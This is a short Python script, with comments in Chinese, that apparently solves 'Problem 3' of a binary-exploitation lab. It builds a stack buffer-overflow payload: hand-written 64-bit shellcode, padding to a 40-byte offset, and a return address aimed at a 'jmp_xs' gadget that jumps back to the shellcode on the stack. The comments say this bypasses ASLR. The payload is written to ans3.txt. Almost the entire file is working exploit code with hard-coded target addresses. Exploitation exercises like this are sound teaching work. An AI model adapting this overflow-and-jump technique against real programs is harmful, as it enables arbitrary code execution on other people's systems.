import struct

# 1. 编写 Shellcode (64位)
# mov rdi, 0x72; mov rax, 0x401216; jmp rax
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00" \
            b"\x48\xc7\xc0\x16\x12\x40\x00" \
            b"\xff\xe0"

# 2. 计算填充
# 缓冲区到返回地址一共 40 字节
padding = b"A" * (40 - len(shellcode))

# 3. 目标跳转地址 (指向 jmp_xs gadget)
# 这个 gadget 会帮我们跳回栈上的 shellcode 起始位置
jmp_xs_addr = struct.pack("<Q", 0x401334)

# 合并 Payload
payload = shellcode + padding + jmp_xs_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload for Problem 3 generated! Using jmp_xs trick to bypass ASLR.")